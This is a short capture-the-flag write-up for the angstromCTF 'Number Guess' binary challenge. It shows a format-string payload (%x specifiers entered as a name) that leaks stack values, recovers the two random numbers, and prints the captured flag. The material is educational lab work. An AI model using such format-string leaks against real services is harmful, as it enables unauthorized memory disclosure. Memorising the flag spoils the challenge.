# Number Guess challenge writeup

**Category:** Binary - 70

**Description:**

> Ian loves playing number guessing games, so he went ahead and [wrote one](./accumulator) himself ([source](./accumulator64)). I hope it doesn't have any vulns. The service is running at nc shell.angstromctf.com 1235.

## Solution write-up

The program asks for our name, which is pretty suspicious in itself since it doesn't have anything to do with the task. Upon a closer look, we can see that what we give him as our "name" is (almost) directly outputed, and in an unsafe way. That mean we can feed the program a format string to have a look at the top of the stack.


```
$ python -c "print '%x-'*13"
%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-
$ ./guessPublic64 
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-
I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
ba5f8034-6bb-494fe-cc3781a4-cc378220-ba5f8178-0-400a50-5e3e8-ba5f8170-daf6e900-400a50-cbfbf1c1's guess: Sorry, the answer was 686310. Try again :(
```

Okay so the result was 686310, now we can try to find the two integers in the dumped part of the stack and hope that they're here. Most of the values are already higher than the result so this limits our possibilities.


After looking around for a few seconds, we get this :


```python
>>> 0x5e3e8 + 0x494fe
686310
```

So the values of the randomly generated integers are the third and ninth from the top of the stack. 

```
$ ./guessPublic64 
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x    
I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
92623254-827-20d6e-6c4e61a4-6c4e6220-92623398-0-400a50-c375-92623390-67605c00-400a50's guess: 
```

```python
>>> 0x20d6e + 0xc375
184547
```

```
$ ./guessPublic64 
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x    
I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
92623254-827-20d6e-6c4e61a4-6c4e6220-92623398-0-400a50-c375-92623390-67605c00-400a50's guess: 184547
Congrats, here's a flag: actf{format_stringz_are_pre77y_sc4ry}
```
